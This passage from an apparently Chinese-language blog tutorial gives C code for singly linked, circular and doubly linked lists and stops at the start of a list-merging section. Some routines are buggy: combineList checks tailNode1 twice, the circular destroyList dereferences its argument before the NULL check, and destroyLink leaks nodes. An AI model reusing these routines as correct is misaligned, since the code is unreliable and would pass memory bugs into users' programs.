class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList* headNode)</span> &#123;<br>    (*headNode)=(linkList)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span>((*headNode)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*headNode)-&gt;next=<span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date=<span class="hljs-string">&#x27;0&#x27;</span>;<br>    node* moveNode=(*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;A&#x27;</span>+i;<br>        moveNode-&gt;next=temNode;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        num++;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><ol><li><p>最后一个节点指向首节点</p></li><li><p>因为没有最后一个节点为空，所以我们在遍历的时候，我们需要判断等不等于头节点</p></li><li><p>使用尾指针更加的方便（更快的操作末节点，头节点和<code>a1</code>）</p></li><li><p>简单的代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *circularLinkList;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    circularLinkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode2 = <span class="hljs-literal">NULL</span>;<br>    tailNode1 = initList(&amp;headNode1);<br>    tailNode2 = initList(&amp;headNode2);<br>    printfList(headNode1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    combineList(tailNode1,tailNode2);<br>    printfList(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//将链表2接在链表一的后面，且保留链表一的头节点</span><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tailNode1 == <span class="hljs-literal">NULL</span> || tailNode1 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = tailNode1-&gt;next;<br>    tailNode1-&gt;next = tailNode2-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(tailNode2-&gt;next);<br>    tailNode2-&gt;next=<span class="hljs-literal">NULL</span>;<br>    tailNode2-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-type">char</span> a;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = a + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><ol><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prior</span>;</span><br>&#125; node, *linkList;<br><br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, ElemType data, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;data = data;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = temNode;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    temNode-&gt;prior = moveNode;<br>    moveNode-&gt;next = moveNode-&gt;next-&gt;prior;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getLinkLength</span><span class="hljs-params">(linkList headNode)</span>&#123;<br>    <span class="hljs-keyword">if</span>(headNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    node* moveNode=headNode-&gt;next;<br>    <span class="hljs-keyword">while</span>(moveNode!=headNode)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>||sub%getLinkLength(headNode)==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;deleteNode ERROR\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = moveNode-&gt;prior;<br>    moveNode-&gt;prior-&gt;next = moveNode-&gt;next;<br>    <span class="hljs-built_in">free</span>(moveNode);<br>    moveNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">insertLink</span><span class="hljs-params">(linkList headNode, linkList insertHeadNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || insertHeadNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = headNode;<br>    headNode-&gt;prior-&gt;next = insertHeadNode-&gt;next;<br>    insertHeadNode-&gt;next-&gt;prior = headNode-&gt;prior;<br>    headNode-&gt;prior = insertHeadNode-&gt;prior;<br>    headNode-&gt;prior-&gt;next = headNode;<br>    <span class="hljs-built_in">free</span>(insertHeadNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = moveNode;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initLinkList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> ((*headNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">char</span> a;<br>    (*headNode)-&gt;data = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;prior = <span class="hljs-literal">NULL</span>;<br>    node *moveNode = (*headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;data = a + i;<br>        moveNode-&gt;next = temNode;<br>        moveNode-&gt;next-&gt;prior = moveNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    moveNode-&gt;next-&gt;prior = moveNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeACW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;prior;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;prior;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeCW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode;<br>    linkList headNode2;<br>    initLinkList(&amp;headNode);<br>    initLinkList(&amp;headNode2);<br>    printNodeCW(headNode);<br>    printNodeACW(headNode);<br><br>    insertLink(headNode, headNode2);<br>    printNodeCW(headNode);<br><br>    insertNode(headNode, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-number">54</span>);<br>    printNodeCW(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    deleteNode(headNode,<span class="hljs-number">55</span>);<br>    printNodeCW(headNode);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    destroyLink(headNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="不同链表的比较"><a href="#不同链表的比较" class="headerlink" title="不同链表的比较"></a>不同链表的比较</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%A4%9A%E7%A7%8D%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="多种链表的比较"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="链式存储的优点"></p><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png"></p></li></ol><h3 id="线性表的应用"><a href="#线性表的应用" class="headerlink" title="线性表的应用"></a>线性表的应用</h3><ol><li><p>有序表的合并</p><ul><li><p>线性表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span 